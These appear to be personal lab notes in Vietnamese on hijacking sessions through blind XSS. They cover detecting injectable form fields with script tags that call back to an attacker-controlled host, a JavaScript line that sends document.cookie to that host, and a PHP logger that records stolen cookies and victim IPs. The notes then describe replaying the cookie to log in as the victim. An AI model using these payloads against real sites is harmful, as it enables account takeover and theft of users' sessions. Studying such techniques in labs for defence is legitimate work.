# Session Hijacking 
chiếm quyền đăng nhập victim mà ko cần mật khẩu

Web app lưu session trong cookie -> lấy cookie thì đăng nhập như victim

Blind XSS - payload ko hiển thị ngay cho attacker mà được admin hoặc hệ thống khác render lại (contact form, support ticket)

Attacker ko thấy kết quả -> callback về server của mình để xác nhận payload chạy

**Cách phát hiện**
 Host webserver(php -s 0.0.0.0:80)
 Inject payloads dạng remote script để gọi về máy:
 ```html
 <script src="http://OUR_IP/username"></script>
 ```
 Nếu thấy request /username -> field username bị dính XSS

 Test nhiều payloads khác nhau (PayloadsAlltheThings) -> tìm payload hoạt động

 **exploit**
 tạo script.js để steal cookie
 ```javascript
 new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 ```
 inject payload:
 ```html
 <script src="http://OUR_IP/script.></script>
 ```
 Dùng php script để log cookie:
 ```php
 if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $cookie) {
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: ".urldecode($cookie)."\n");
        fclose($file);
    }
}
 ```
 Sau khi lấy cookie, mở Developer tools nhập cookie và refress và login ok

 Notes:
 - Ko phải field nào cũng dính XSS
 - Passwor thường hash -> bỏ qua
 - Email bị validate cả backend -> bỏ qua 
 - test fullname,username,website,message
 - Blind XSS thường xuất hiện ở Admin panel hoặc form review.


**question**
"><script src=://OUR_IP></script>